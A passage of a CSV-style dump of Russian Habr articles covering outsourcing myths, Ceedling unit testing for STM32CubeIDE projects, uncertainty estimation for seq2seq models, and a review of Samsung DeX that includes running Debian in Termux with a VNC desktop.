продакт-менеджер, который умеет мотивировать команду, и именно эти ребята станут лучшим решением для вашего проекта. Поэтому стоит хорошо изучить рынок IT-аутсорса, пообщаться с разными командами, проанализировать их опыт и кейсы.Предубеждение 6: если команда работает по Time&Material, есть риск переплатитьПредставим, что студия работает по формату оплаты Time&Material, где работа специалистов оценивается по фактическим итоговым часам, а не по предварительной оценке. В ходе разработки один из сеньор-разработчиков уходит, и на его место приглашают программиста с грейдом ниже. Он делает работу дольше, и это увеличивает ваши расходы.Риск нарваться на компанию с текучкой кадров действительно есть, но такие изменения в процессе работы легко заметить. Если вы уже начали сотрудничать и заметили, задачи выполняются дольше, можно попросить у команды тайм-лог и подключить третьего разработчика со стороны. Чтобы он смог оценить, насколько время выполнения задач совпадает с требованиями к работе программистов. Так вы сможете выявить обман и потребовать перераспределения бюджета.В целом, если проект предварительно декомпозируется для оценки, точность итоговых бюджетов будет довольно высокой. Нужно также учесть, что при работе по Fix Price студия часто включает в стоимость проекта риски, которые в итоге могут не возникнуть. Этот момент можно обговорить перед началом работы.Предубеждение 7: на аутсорсе возрастает вероятность потерять конфиденциальные данныеКажется, что найм сторонней команды — это дополнительные риски для информационной безопасности, так как вы передаете материалы за пределы корпоративной сети. Под угрозой могут оказаться внутренняя информация о компании или данные пользователей. Это мнение не беспочвенно — случаи, когда происходили утечки данных, уже бывали. Но вероятность потери информации можно снизить, заключив с подрядчиком соглашение о неразглашении. А еще — включить в условия договора соблюдение коммерческой тайны для всех сотрудников, включая тех, которые уволились в процессе работы над проектом. Если все сделать грамотно, больших отличий между правами команды на аутсорсе и вашими сотрудниками в штате не будет, а вы обезопасите свои данные.Предубеждение 8: передать проект от команды на аутсорсе в инхаус маловероятно без потери качестваРазница в процессах работы, непонятный код и документация, разное видение тимлидов на проект — все это может негативно повлиять на продукт при передаче от студии в инхаус-команду. Поэтому лучше сразу набирать свою команду и разрабатывать продукт своими силами.На это сомнение можно ответить так: обычно хорошие студии сами заинтересованы в том, чтобы максимально бесшовно передать проект в инхаус. В CleverPumpkin мы разбиваем этот процесс на несколько этапов и не выходим из работы, пока не убеждаемся, что разработчики разбираются в продукте и могут легко подхватить его развитие. Некоторые команды, в том числе и мы, готовы помочь с наймом специалистов в инхаус. И дело тут даже не в репутации — все-таки мы работаем над проектом по нескольку месяцев или даже лет, и нам хочется, чтобы в дальнейшем его ждал рост и успех. Подробнее о том, как мы передаем проект в инхаус, мы описали в статье.Предубеждение 9: разработка на аутсорсе дороже, чем инхаусСтоимость создания IT-продукта у хорошей студии может быть довольно высокой. Разработка своими силами на фоне цен на рынке аутсорса кажется более выгодной. На деле часто оказывается наоборот. Собирая собственную команду, можно затратить больше ресурсов. А если ваш продукт предполагается самодостаточным после релиза и будет обновляться редко, найм собственной квалифицированной команды однозначно обойдется дороже.Для старта проекта лучше заложить качественный фундамент по общерыночным стандартам с опытными разработчиками на аутсорсе. А потом, если ваше приложение будет требовать постоянной поддержки, забрать его в компанию и обращаться к аутсорс-команде только за консультациями. Лучшее решение для того, чтобы избавиться от страхов и предрассудков, которые связаны с IT-аутсорсом — выбрать хорошую команду. С надежным подрядчиком снижаются риски получить некачественный продукт и потерять деньги и время. О том, как найти студию разработки, которая поймет вашу идею и превратит ее в продукт, мы писали в статье «Как выбрать компанию-мобильного разработчика». Ознакомьтесь  с нашими рекомендациями и сделайте правильный выбор!",2024-01-26
Добавляем Unit-тестирование в проекты STM32CubeIDE,1,0,https://habr.com/ru/articles/789202/,"А именно, мы будем добавлять отличную систему Сeedling. Данная система содержит в себе сразу два инструмента – Unity – непосредственно для проведения и написания тестов и CMock для генерации объектов-заглушек. Но самая большая заслуга данного пакета – простота во всех аспектах – начиная от генерации тестируемых модулей и до релиза проекта. Использование Сeedling превращает рутинное TDD (Разработка через тестирование) или TLD(если захочется так) в обычный рабочий процесс. Как именно использовать данные инструменты:Свежее переиздание Test Driven Development for Embedded C (Pragmatic Programmers) от James W. Grenning Немного устаревшая(Ceedling уже не генерирует rake в тестируемом проекте и некоторые команды изменились), но все еще хорошая статья от Dmitry FrankКонечно же, GIT разработчиков. Там найдется самая всеобъемлющая информация по использованию их инструментов, например, CMock, Ceedling.Ну, и конечно, когда-то я соберусь с силами написать небольшую заметкуПредположим, что уже знакомы с Ceedling и нужно лишь его как-то прикрутить к нашим проектам, желательно, чтобы тесты запускались сами при старте сборки. Как инициализировать тестирование в уже существующем проектеНастройка окруженияТерминалУ Eclipse, на базе которой построен STM32CubeIDE, есть сложность с вызовом терминала в рабочей директории – он может открыть терминал, но он будет в папке с установленным STM32CubeIDE. Для удобства советую установить TM Terminal (А лучше работать в VSCode, где уже терминал поддерживается, а IDE использовать для генерации и построения исходников)Он позволяет вызвать терминал в любой папке.ИнициализацияДля примера буду показывать на тестовом проекте, который назван programel_prj. Для инициализации системы тестирования введем следующие команды в открывшимся терминалеE:\programel_prj>cd ../
E:\>ceedling new programel_prj
Welcome to Ceedling!
      create  programel_prj/project.yml
Project 'programel_prj' created!
 - Execute 'ceedling help' from programel_prj to view available test & build taskЗдесь мы переходим выше на уровень и вводим имя проекта идентичное созданному проекту. Это можно делать и в проектах, которые уже созданы были ранее.Был создан файл project.yml и папка src. Папку src можно удалить. Если файлы не отобразились в окне с проектом можно обновить через F5.Правка автогенератораПосле инициализации проекта Ceedling, стоит произвести некоторые изменения в файле project.yml. Зачем? (Предположим, что инициализация проекта производится с помощью кодогенератора)Структура проекта в STM32CubeIDE генерируется сама. После завершения настройки пинов, интерфейсов и т.д. в *.ioc-файле следует запуск кодогенератора. После чего будет произведено построение проекта с определенной структурой. Мы же хотим применить TDD подход при разработке новых модулей в проекте. Удобно, если сам Ceedling будет создавать заголовочные файлы и исходники в нужных местах. В первую очередь добавим следующее в project.yml после секции с :project:::project:
  :use_exceptions: FALSE
  :use_test_preprocessor: TRUE
  :use_auxiliary_dependencies: TRUE
  :build_root: build
#  :release_build: TRUE
  :test_file_prefix: test_
  :which_ceedling: gem
  :ceedling_version: 0.31.1
  :default_tasks:
    - test:all
:module_generator:
  :project_root: ./
  :source_root: Core/Src/
  :inc_root: Core/Inc/
  :test_root: test/Значит, мы добавили :module_generator: в котором определили где именно будут создаваться новые файлы модуля. Можно и название у папки test сменить, но меня это название устроило. Необходимо сообщить об этом и в секции :paths::paths:
  :test:
    - +:test/**
    - -:test/support
  :source:
    - Core/Inc/**
    - Core/Src/**(Необязательно) В секции :cmock: с добавим дополнительный заголовочный файл с определением стандартных типов (uint8_t, int32_fast_t и т.д.):cmock:
  :mock_prefix: mock_
  :when_no_prototypes: :warn
  :enforce_strict_ordering: TRUE
  :plugins:
    - :ignore
    - :callback
  :treat_as:
    uint8:    HEX8
    uint16:   HEX16
    uint32:   UINT32
    int8:     INT8
    bool:     UINT8
  :includes:
   - <stdint.h>Создание модуляСоздадим модуль module_sample. Для этого введем в TM Terminal следующее:E:\programel_prj>ceedling module:create[module_sample]
File Core/Src/module_sample.c created
File Core/Inc/module_sample.h created
File test/test_module_sample.c created
Generate CompleteОтлично, все файлы создались в нужных местах!Прям почти настоящее TDD!В сгенерированных файлах весь код инактивирован проверкой определенного макроса. Чтобы это исправить – в настройках сборки, например, Debug определим макрос TEST.И ещё – добавим заголовочный файл от Unity(unity.h) в папку Inc. Это позволит нам использовать автодополнение при написании непосредственно самих тестов. Данный файл у меня располагается по следующему адресу – E:\Ruby30-x64\lib\ruby\gems\3.0.0\gems\ceedling-0.31.1\vendor\unity\src\Автоматический прогон тестов при сборкеЧтобы тестирование прогонялось автоматически при каждой сборке – нужно добавить пару комманд в build steps. Все команды в мэйкфайлах выполняться в папках Debug или Relase – в зависимости от выбранной целевой сборки. Чтобы выполнить тестирование – нужно перейти выше по каталогу (в основную папку с проектом) и выполнить команду ceedling. Для добавления пользовательских команд, которые должны быть выполнены до или после сборки есть специальные поля ввода – pre/post build steps. Команды можно объединять в цепочки через специальные знаки (см. Chaining Commands в поисковике). Мне было бы удобнее в post-build, но в моей версии STM32CubeIDE встроены специфичные генераторы make-файлов. Они форматируют строку post-build, всегда разделяя команды друг от друга. У меня не одного такие проблемы возникли – об этой гадости подробнее тут:Eclipse Community Forums: C / C++ IDE (CDT) » Post-Build Stepcd ../; ceedling test;В файле test_module_sample.c теперь все хорошо и весь необходимый синтаксис корректно подсвечивается. Изменений вносить в файл не будем, оставим как есть – один игнорируемый тест. Запустим сборку Debug версииЧто мы видим в окне Console:15:59:53 **** Build of configuration Debug for project programel_prj ****
make -j12 all 
cd ../; ceedling test;
Test 'test_module_sample.c'
---------------------------
Generating runner for test_module_sample.c...
Compiling test_module_sample_runner.c...
Compiling test_module_sample.c...
Compiling unity.c...
Compiling module_sample.c...
Compiling cmock.c...
Linking test_module_sample.out...
Running test_module_sample.out...
--------------------
IGNORED TEST SUMMARY
--------------------
[test_module_sample.c]
  Test: test_module_sample_NeedToImplement
  At line (17): ""Need to Implement module_sample""
--------------------
OVERALL TEST SUMMARY
--------------------
TESTED:  1
PASSED:  0
FAILED:  0
IGNORED: 1
 
arm-none-eabi-gcc ""../Drivers/STM32F0xx_HAL_D..............Отлично! Выполнился(был проигнорирован) один тест. Мы прикрутили тестирование к нашему проекту, теперь можно достаточно удобно пользоваться инструментом тестирования при разработке своих проектов в STM32CubeIDE.",2024-01-26
Предсказать ошибку. Как методы оценки неопределенности помогают повышать качество seq2seq-моделей,1,0,https://habr.com/ru/companies/airi/articles/787340/,"Всем привет! Меня зовут Артём Важенцев, я аспирант в Сколтехе и младший научный сотрудник AIRI. Наша группа занимается исследованием и разработкой новых методов оценивания неопределенности для языковых моделей. Этим летом мы опубликовали две статьи на конференции ACL 2023. Про одну из них я уже рассказывал в одном из предыдущих текстов — там мы описали новый гибридный метод оценивания неопределенности для задачи выборочной классификации текстов. Другая же статья про то, как мы адаптировали современные методы оценивания неопределенности на основе скрытого представления модели для задачи генерации текста, а так же показали их высокое качество и скорость работы для задачи обнаружения примеров вне обучающего распределения. Ниже я хотел бы подробнее рассказать об используемых методах и результатах, которые мы получили. http://stock.adobe.com/Плохие примерыЗадача генерации текста (sequence-to-sequence, seq2seq) в последнее время стала очень популярной и востребованной во многих практических приложениях, таких как машинный перевод, чат-боты и т.д. Однако, при применении моделей генерации текста нужно не только достичь высокого качества сгенерированного текста, но и во время обнаружить условия, при  которых данная модель не применима. Например, текст с большим количеством ошибок и опечаток, и просто текст, для которого модель затрудняется дать ответ. Например, ChatGPT, который может в ответ на вопрос привести неверный факт из биографии или придумать автора статьи, т. е. «галлюцинировать». Модель перевода текста также может выдавать плохо сгенерированный ответ, например, как на картинках ниже:DeepL Translate. Переводчик не может корректно обработать входной текст и выдает бессмысленный ответ. Google Translate. Переводчик переводит кусок кода в кусок код с ошибками. Такие примеры можно отлавливать с помощью оценок неопределенности. Оценка неопределенности дает понять, насколько модель не уверена в сгенерированном тексте, на основе чего можно сделать вывод, что модель не справилась с данным входным текстом. К сожалению, современные методы для выявления таких примеров для генеративных текстовых моделей либо обладают низким качеством, либо являются методами на основе ансамбля (то есть объединение нескольких нейросетей). Последнее делает их неприменимыми на практике, т.к. современные модели могут весить десятки гигабайт, а для ансамбля нужно обучить и хранить как минимум 5 таких моделей. С другой стороны, в соседней области машинного обучения, а именно в задачах классификации текста и картинок хорошо себя показывают методы оценивания неопределенности для примеров вне обучающего распределения (out-of-distribution, OOD), которые, как известно, могут быть источниками ошибок, в отличие от примеров внутри обучающего распределения (in-distribution, ID). Этот факт сподвиг нашу научную группу под руководством Александра Панченко и Артёма Шелманова адаптировать современные методы для определения OOD-примеров для seq2seq-моделей.Немного математикиКак правило, выделяют несколько групп методов оценивания неопределенности по типу данных, которые использует метод.Information-based методыПервая группа основана на вероятности сгенерированной последовательности (Information-based). Пусть x — это входная последовательность, а y — сгенерированная последовательность длины L. Тогда для авторегрессионной модели с параметрами θ вероятность сгенерированной последовательности выглядит следующим образом:где y<l = {y1, …, yl-1} — все сгенерированные токены до yl. Тогда можно посчитать базовый метод maximum sequence probability (MSP) для оценивания неопределенности модели, который выглядит следующим образом:Кроме того, можно нормализовать вероятность P(y | x, θ) на длину последовательности, получив Normalized Sequence Probability (NSP): гдеэто нормализованная вероятность сгенерированной последовательности.Средняя потокенная энтропия (entropy) позволяет обобщить стандартную оценку энтропии для авторегрессионных моделей:где ℋ(yl | y<l, x, θ) — энтропия распределения вероятностей токенов P(yl | y<l, x, θ).   Преимуществом information-based методов, основанных на вероятности модели, является скорость подсчета, однако, они не всегда показывают высокое качество работы.АнсамблированиеСледующая группа методов основана на ансамблях нескольких моделей. Существует несколько подходов к ансамблированию вероятностей для генеративных моделей. Первый подход предполагает, что на каждом шаге генерации нового токена мы усредняем вероятности из нескольких моделей (Product of Expectations, PE). Другой подход агрегирует вероятности целых последовательностей, полученных при генерации каждой модели по отдельности (Expectation of Products, EP). Для каждого из подходов можно рассматривать два вида оценок неопределенности — на уровне последовательности и на уровне токена. Для оценки неопределенности на уровне последовательности выделяют два метода, полученные через энтропию вероятностей, Total Uncertainty (TU) и Reverse Mutual Information (RMI), для оценки на уровне токенов — Total Uncertainty (TU), Reverse Mutual Information (RMI), Mutual Information (MI) и Expected Pairwise KL Divergence (EPKL).Ранее было показано хорошее качество работы таких методов для обнаружения OOD-примеров, однако, как уже упоминалось ранее, хранить целый ансамбль моделей и каждый раз запускать его является достаточно сложной задачей, не всегда применимой на практике.Подробнее про методы можно ознакомиться в приложении в нашей статье и здесь.Density-based методыПоследняя группа методов — методы основанные на скрытом векторном представлении модели (density‑based). Такие методы нас интересовали больше всего, так как они показали хорошую способность определять OOD‑примеры с высокой скоростью работы в классификационных задачах, однако не были адаптированы для seq2seq моделей. Для получения оценки неопределенности мы решили использовать эмбеддинги с последнего слоя энкодера и последнего слоя декодера Трансформера, усредненные по всем сгенерированным токенам. Первый метод — Mahalanobis Distance (MD), который в случае генеративной модели выглядит следующим образом:где h(x) — эмбеддинги (энкодера или декодера) для примера x; μ и Σ — центроида и матрица ковариции эмбеддингов, посчитанная на обучающем датасете. А так же, мы провели эксперименты с Robust Density Estimation (RDE), который является модификацией MD, но использует kernel PCA разложение для эмбеддингов и считает матрицу ковариации через алгоритм MinCovDet.Далее, когда мы используем эмбеддинги из энкодера, будем называть методы MD-Enc. и RDE-Enc., если из декодера — MD-Dec. и RDE-Dec.ЭкспериментыМы провели эксперименты с большим количество разнообразных ID‑ и OOD‑датасетов, чтобы покрыть достаточно большое количество возможных ситуаций с возникновением OOD‑примеров в реальных задачах. В качестве основной задачи для генерации тексты мы использовали три наиболее популярные: суммаризация текста (ATS), перевод текста (NMT) и задача ответов на вопросы (QA). На каждой из задач мы проводили эксперименты следующим образом. Сначала обучали модель на ID‑датасете, а потом в качестве теста брали тестовую часть ID и соединяли её с OOD‑датасетом. Очевидно, что качество сгенерированного текста будет низкое на OOD, т.к. модель обучалась на другой задаче. После этого считали оценки неопределенности модели для каждого примера и смотрели насколько эти оценки позволяют разделять ID‑ и OOD‑примеры. В качестве метрики мы считали ROC‑AUC — стандартную метрику качества для такой задачи. Для ATS мы провели эксперименты с моделью BART на каждом из 4-х ID‑датасетов — AESLC, XSUM, MR, Debate. В качестве OOD‑части тестового датасета мы взяли каждый из оставшихся датасетов по отдельности, а также эту саму тестовую часть ID‑датасета, но с перемешанными словами (PRM). В подобранных экспериментах PRM — это набор слов в случайном порядке, а остальное — OOD‑датасеты, совершенно новый домен, для которого модели сложно корректно сделать суммаризацию текста. Таким образом мы получили по 4 комбинации ID+OOD для каждого ID‑датасета. Для NMT мы обучали модель mBART на двух задачах — WMT14 En‑to‑De, WMT20 En‑to‑Ru. А в качестве OOD‑части тестового датасета брали, как и ранее, его PRM‑версию, а также LibriSpeech, WMT20 Reddit и WMT14 Fr. Здесь каждый из датасетов представляет собой разные OOD‑примеры. Например, LibriSpeech — это датасет с текстами из разговорной речи, тогда как исходный ID — письменная речь. WMT20 Reddit — набор данных, составленный из комментариев с Reddit, в котором много опечаток, ошибок, сленга и нестандартной речи. WMT14 Fr — тексты на французском языке, для которого модель не обучалась делать перевод. Для задачи перевода мы собрали также 4 разнообразные комбинации ID+OOD для каждого из ID‑датасетов. Для QA мы использовали предобученную модель T5 для QA на двух ID датасетах — SQ, RuBQ-2.0. Здесь для OOD‑части мы использовали также PRM версию тестовой части, RuBQ Ru и Mintaka. RuBQ Ru представляет собой датасет с вопросами на русском языке, для которого модель часто не может давать корректные ответы, т.к. обучалась только на английском; Mintaka — датасет с более сложными и естественными вопросами. Подробнее про QA‑задачу и пути её решения вы можете прочитать в посте от наших коллег, который вышел на Хабре не так давно.РезультатыМы представили результаты в виде ROC-кривых для 6 выбранных методов, по 2 лучших из каждой группы методов. Подробные результаты в виде таблицы со значениями ROC-AUC для всех методов представлены в нашей статье на ACL 2023 (Findings). На графиках ниже представлены результаты для задачи NMT, датасет описан в заголовке каждого графика в виде ID-OOD:ROC-кривые для обнаружения OOD примеров для задачи NMT. В заголовке первый датасет означает ID, второй — OOD. Видно, что MD-Enc. — стабильно лучший метод среди всех, значительно опережающий базовые методы, включая ансамбли. Более того, на 2 комбинациях ID-OOD, этот метод почти идеально отделяет ID примеры от OOD, с качеством по ROC-AUC равным 1. На других графиках представлены результаты для задач ATS и QA соответственно:ROC-кривые для обнаружения OOD примеров для задачи ATS (верхний ряд) и QA (нижний ряд). В заголовке первый датасет означает ID, второй — OOD.Аналогичный вывод можно сделать и для этих задач — density‑based методы значительно превосходят любые другие методы в этих задачах. Кроме того, для некоторый комбинаций ID-OOD видно, что методы на основе вероятностей могут давать ROC-AUC не только меньше 0.5, но и близко к 0. Это означает, что модель может для OOD-примеров быть более уверена, чем для ID-примеров, что дает очень ненадежную оценку неопределенности для задачи обнаружения примеров вне обучающего распределения.В дополнение можно посмотреть на результаты не только по метрикам качества ROC-AUC, но и на реальных примерах из датасета WMT20 в таблице ниже:Текстовые примеры для задачи NMT и оценки неопределенности для нихЗдесь BLEU — метрика качества сгенерированного текста (от 0 до 100), MSP и MD-Enc. — значения оценки неопределенности, нормализованное в диапазон от 0 до 1. Можно заметить, что первый пример имеет достаточно высокое качество ответа, однако по MSP неопределенность 0.92, что является некорректным в данном случае. С другой стороны, на текстах из PRM-датасета, качество BLEU низкое, но при этом модель по MSP имеет относительно низкую неопределенность <0.5. Хотя в этом случае MD-Enc. дает корректную высокую неопределенность >0.9.Кроме того, мы провели исследование времени инференса для каждого из представленных методов, что показано в следующей таблице: Время работы различных методов оценки неопределенности для задачи NMT Можно заметить, что density-based методы не только превосходят по качеству ансамблиевые методы, но и в 60 раз быстрее по общему времени работы, что является значительным преимуществом для использования на практике.ЗаключениеВ своей работе мы адаптировали density‑based методы для seq2seq моделей для задачи обнаружения примеров вне обучающего распределения. Мы показали, что такие методы существенно превосходят современные методы на основе ансамблей. Однако, на практике важно определять не только OOD примеры, но и ID‑примеры, на которые модель не может корректно ответить и может давать ложные факты (галлюцинировать). Такая задача называется выборочная генерация, и является важной задачей для будущего исследования работы LLMs.",2024-01-26
Samsung DEX в 2024 году: есть ли смысл?,1,0,https://habr.com/ru/articles/789076/,"Кадр из сериала “Happy!”В далёком 2017 году в Samsung для своих флагманов (на тот момент S8/S8+) на базе Android 7 добавили особый режим DeX. Он позволяет работать на внешнем мониторе в похожем на десктопное окружении, и подключать периферию (в частности, клавиатуру/мышь). Альтернативы тоже были и есть: гугл подсказывает, что без DeX выводить контент на ТВ через Google Chromecast можно было судя по документации начиная с Android 8 (нужна ещё и поддержка на стороне ТВ/приставки), такая же история с совместимостью и с Miracast. А ещё есть технология MHL, и тут на 4pda есть даже отдельный список устройств которые умеют вывод по HDMI (как с MHL, так и сами). При этом тут на Хабре в 2020 уже был краткий обзор DeX середины 2020 года, и пришло время посмотреть на эту фичу спустя 3.5 года.В общем, способы вызволить джина из бутылки Андроид из смартфона есть давно. После покупки устройства, которое это умеет, стало интересно пощупать это вживую и посмотреть, имеет ли оно смысл в 2024 году.Для честности следует заметить, что iPhone/iPad тоже умеют выводить картинку на внешний монитор, но просто в режиме дублирования экрана, что совсем не похоже на сабж. Может, в 15 iPhone что-то изменилось, поправьте тогда, пожалуйста, в комментариях.ОборудованиеСобственно, минимум который нужен — это смартфон с DeX и USB-C хаб с поддержкой HDMI (и если использовать Bluetooth периферию, то больше разъёмов и не надо). Итак, что я тестировал сам для проводного режима DeX:смартфон Samsung S23хаб Hoco HB28монитор с HDMIпериферия (можно Bluetooth, если хаб с USB — то проводные, работают все, проверял).Хаб Hoco HB28 в реальной жизниСразу оговорюсь, что хаб подходит по идее любой, который умеет подключаться по Type-C и выводить картинку на HDMI. Например, из тех какие любят маководы. Для мониторов без HDMI есть хабы с DisplayPort и шнурки Type-C - DisplayPort, должно тоже работать, но не проверял (не на чем).Также поддерживается беспроводной режим DeX, но для него нужен уже не совершенно любой тупой ТВ или моник, а смарт-ТВ с Miracast. У меня такого нет, только монитор, так что формат не подходит. Уверен, что среди читателей будут люди со смарт-ТВ так что можете потестировать и похвастать в комментариях 😉.На практике использовалось подключение к монитору FullHD на 23 дюйма, и другому — 2K WQHD 2560x1440. При этом “из коробки” не выводится картинка с разрешением выше чем FullHD, немного поиска — был найден ответ на 4pda (может кому будет полезно):надо установить дополнительно из Samsung Galaxy Store две программы Good Lock и MultiStarпотом запустить Good Lock и в меню Multistar → I love Samsung DEX включить High resolutions for external display. Там же рекомендую сразу включить Run many apps at same time.после подключения к монитору в меню Настройки → Samsung DeX → Разрешение экрана выбрать нужное (если автоматом не подхватилось).Особенности самой ОС в режиме DeXКак на большинстве десктопных ОС, внизу будет панель задач с со своей кнопкой Пуск, часами, статус-баром, иконкой активного языка (раньше судя по статье 2020 года не было языка). Далее небольшой список ключевых моментов.Можно пользоваться одновременно и телефоном и монитором (DeX). Например, можно позвонить не отключаясь от DeX. Можно открыть на телефоне телегу, чатиться, и что-то делать на мониторе. Но с небольшими особенностями (см. ниже).Любое приложение можно открыть только либо на телефоне либо на внешнем экране. Например, если мессенджер открыть на телефоне и потом на мониторе, то он какбы перенесётся, и на телефоне исчезнет. Работает переключение быстро, практически мгновенно. По сути аналог переноса окна приложения с одного монитора на другой в десктопной ОС.Приложения переносятся корректно (но не все): например если запустить сначала Chrome в DeX и открыть несколько вкладок, потом открыть браузер на смартфоне, то браузер откроется без вкладок новым окном (в списке активных приложений будет другой браузер с вкладками из DeX). Смахиваем ненужный пустой браузер, и можно юзать нужный. Но поведение нелогичное.По умолчанию активно переключение языков по Alt+Shift, Shift+Space, Ctrl+Space, их можно отключить в меню Настройки → Samsung DeX → Клавиатура → Дополнительные настройки → Физическая клавиатура но нельзя задать свою комбинацию. Там же есть и шпаргалка по всем доступным сочетаниям клавиш в ОС, доступны разные привычные типа переключение между окнами по Alt+Tab, сворачивание всех окон по Win+D, закрытие активного окна по Alt+F4 и пр. Привычный по Линуксам Win+Space переключает метод ввода, но не язык (не меняется в углу), тут получилось неудобно, да.Полноценный многооконный режим, открыть можно сразу много разных приложений и менять размеры окон, закреплять, делать прозрачными, но быстро кончается оперативная память (Андроид сильно прожорлив, и его софт ещё голоднее). На Debian на десктопе 8 гиг RAM хватает очень на многое, тут же браузер с несколькими вкладками, камера, карты, и ещё несколько программ привели к тому, что вкладки в хроме постоянно перезагружались при переходе по ним. Это при том что я меню программ заморозил (отключил) всякий ненужный мне мусор типа Bixby, Android Auto etc. Для каждого приложения запоминается размер окна и после повторного открытия открывается в старом размере, удобно (даже после отключения и подключения режима DeX).Есть стандартная панель быстрых настроек (есть ниже на одном из скринов), чтобы включить/выключить вай-фай, поуправлять громкостью и прочее.Стандартное приложение камеры открывается в DeX, но сильно урезанное, есть только переключение фото-видео и старт-стоп, никаких настроек. Что удивило. Может, условный GCam будет норм, не проверял.Многие приложения запускаются без подстройки масштабирования под большой внешний монитор. Например, на скрине ниже видно как стрёмно сразу выглядят карты (не стал искать где масштаб менять, по CTRL+колёсико не меняет). В принципе, можно дать доступ к местоположению в браузере и юзать браузерную версию. Такая же история была с читалкой Alreader, но там легко вручную масштаб уменьшил для скрина.Настройки открываются полноценные такие же как и на телефоне. Вообще кроме камеры не обнаружил проблем с потерей функционала.Можно выводить экранную клавиатуру на монитор или экран смартфона если вдруг нет физической. Также экран смартфона можно использовать как тач-панель (активируется тапом по особой иконке в левом нижнем углу на самом телефоне).Смартфон разряжается не то чтобы быстро, но заметно: с учётом беспроводной клавиатуры и проводной мыши при наборе этого текста примерно на 16% за 1 час (подозреваю, что у условного Ultra с бОльшей батареей будет медленнее разряд). Удобнее всего поставить смартфон на беспроводную зарядку — нагрузка в режиме инет-сёрфинга и несложных приложений не сильная, перегрева девайса не будет. Также хаб может уметь подавать заряд через Type-C (Hoco умеет во всяком случае).Далее немного скринов:Активно много программ. Заметно как съелась памятьСписок запущенных приложенийХром, десктопный режим в почтеПанель быстрых настроек, настройки DeX, читалкаТакже из-за того, что некоторые приложения вообще не разрабатывались с учётом большого размера окон, возможны забавные баги, например как ниже в клиенте WireGuard:Задвоился список при увеличении размера окна, при этом работает переключение конфигов нормальноОсобенности работы в браузере и сервисахКак и было отмечено в обзоре 2020 года, браузер в режиме DeX ничего не знает о том, что он должен прикинуться десктопным, и сайты открывает как планшет по сути (отправляя инфу, что браузер мобильный).Я использую Chrome, и как оказалось он сильно лучше подходит чем, скажем, Firefox. При этом что есть в Chrome “из коробки”:адекватно автоматически масштабируется под внешний дисплейнормальные вкладки вверху как на десктопеработает открытие ссылки по средней кнопке мыши в новой вкладкеработают привычные хоткеи типа Ctrl+T, Ctrl+W, Ctrl+N, Ctrl+Shift+T, Ctrl+Shift+N, Ctrl+Tab, Ctrl+D, Ctrl+Shift+B, Ctrl+H etc.Что работает, но после небольших телодвижений:ссылки на почту, гугл-доки и т.п. хотят открываться в приложениях или если таковых не установлено — в каком-то урезанном мобильном варианте. Но можно обойти: скопировать ссылку и явно вставить в новой вкладке, потом включить десктопный режим по кнопке “три точки” в углу браузера. Так, например, набрана эта статья на внешнем мониторе. Также выше на скрине видно нормальный десктопный вариант Gmail-почты.В Chrome нет DevTools, и нет расширений чтобы добавить такую фичу. Потому возникла идея поставить Firefox и расширение DevTools (есть там такое). В итоге Firefox совершенно не умеет понимать что он на большом экране с другим ppi и работает ужасно, без масштабирования (и не нашёл в настройках как чинить). Активация флажка “Вид для ПК” не помогает. Ниже на примере сайта Хабра видно как это выглядит при смене ширины окна на 2К мониторе (сначала сильно большой размер элементов на сайте, потом сильно мелкий):Также в Firefox не работают хоткеи типа Ctrl+W, и нет вверху или внизу нормальных табов. Но да, расширение поставилось. В общем, Firefox не подошёл.Потом я вспомнил, что вообще-то есть же стандартный Samsung Internet, который я просто по привычке сразу удалил с телефона при первоначальной настройке. Ну что ж, вернём и потестим его. И как оказалось, всё весьма неплохо: масштабирует адекватно, есть сразу поддержка тёмных тем для сайтов, есть поддержка своих дополнений которые ставятся из Galaxy Store (отдельным пунктом в настройках есть блокировщики рекламы), и потому активировал резатель рекламы и пошёл искать в дополнениях DevTools… И ничего не нашёл и судя по всему расширений там сильно негусто. Переключение по вкладкам список не увеличило:Хабр в тёмной теме и какой-то короткий список расширений для Samsung BrowserYouTube в своём родном приложении выглядит как и ожидалось странно (можно развернуть на весь экран, но два раза, сначала само приложение потом видео в приложении, по стрелкам):Лучше выглядит если открыть в режиме ПК в браузере, но разворачивать из оконного режима также придётся двумя кликами:Протестированные дополнительные возможностиЗапуск Linux и софта в нёмКогда-то сама компания Samsung разработала в 2018 году и год поддерживала приложение Linux on DeX, но потом его прибила. Однако возможность появилась благодаря приложению терминала Termux и пакету PRoot.Про сам Termux есть прекрасная статья “Код доступа Termux” от господина @ne555. Там перечислены интересные кейсы работы с терминалом начиная с очевидных типа управления сервером по SSH и до более интересных типа построения графиков. Люто бешено рекомендую! Очевидно, что на внешнем мониторе да ещё и с физической клавиатурой эти вещи делать будет ещё удобнее.Тут же напомню кратко, что мы делаем для запуска Linux (например, Debian) на смартфоне в режиме DeX:Ставим терминал Termux. Помним что он работает сразу под рутом и не надо ставить нигде sudo.Обновляем пакеты (у Termux свои репозитории): pkg update && pkg upgrade -yДалее по официальному мануалу, ставим пакет proot-distro: pkg install proot-distro Ставим какой-то из доступных Linux (например Debian 12):proot-distro install debianВходим в установленный Debian:proot-distro login debianОбновляем пакеты и ставим VNC сервер (чтобы подключаться к Linux интерфейсу):apt update && apt install tightvncserver -yСтавим легковесное графическое окружение (например lxde, я ставил всё, вместе с Libre Office как раз заодно):apt install task-lxde-desktopЗапускаем vncserver с нужным разрешением, например 1388x768:vncserver -geometry 1366x768При первом запуске команды будет запрошено создание пароля — вводим какой нравится.В терминале видим вывод типа New 'X' desktop is localhost:8 — это значит, что всё запустилось и можно подключиться с помощью VNC клиента.Ставим на смартфон из Google Play любой VNC клиент, например AVNC.Запускаем его в режиме DeX и подключаемся одним из двух способов: либо просто вводим в поле вверху localhost:8 (адрес из шага 10), либо добавляем сервер через кнопку “плюс”, тогда надо указать адрес сервера localhost и порт 560x где x — число после localhost из пункта 10. Вообще лучше в Termux проверить порт с помощью команды ps -ef | grep whoami | grep vnc. В любом случае для подключения вводим пароль, указанный в шаге 9.После чего видим рабочий стол Debian LXDE, ставим туда что хотим и пользуемся. Для примера поставил NodeJS и локально запустил проект рабочей документации (т.к. на работе занимаюсь в том числе составлением мануалов). Debian запущен в окне в правой части скрина:Также был успешно протестирован запуск разных редакторов из пакета Libre Office, и редактора Gimp т.к. на Android действительно нет нормальных редакторов с поддержкой слоёв (или не нашёл), и один скрин (составленный из двух картинок) для данной статьи пришлось собирать именно там. В качестве браузера Firefox на Debian показывает себя вполне нормально. Весь софт ставится нормально с репозиториев через apt.Поставить VirtualBox нельзя (его нет под arm64), а docker хоть и ставится но падает с ошибкой отсутствия прав к 